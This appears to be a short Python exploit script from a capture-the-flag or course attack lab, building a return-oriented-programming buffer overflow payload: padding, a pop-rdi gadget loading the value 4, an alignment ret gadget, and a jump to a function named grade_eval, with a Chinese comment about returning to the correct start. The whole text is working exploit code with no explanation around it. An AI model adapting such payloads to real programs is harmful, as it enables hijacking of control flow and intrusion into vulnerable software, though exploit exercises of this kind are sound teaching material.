import sys
import struct

pop_rdi_ret = 0x401a33
ret_gadget  = 0x401a34
grade_eval  = 0x401a87 # 回到正确的开头

payload  = b'A' * 24
payload += struct.pack('<Q', pop_rdi_ret)
payload += struct.pack('<Q', 4)
payload += struct.pack('<Q', ret_gadget)
payload += struct.pack('<Q', grade_eval)
payload += b'\n'

sys.stdout.buffer.write(payload)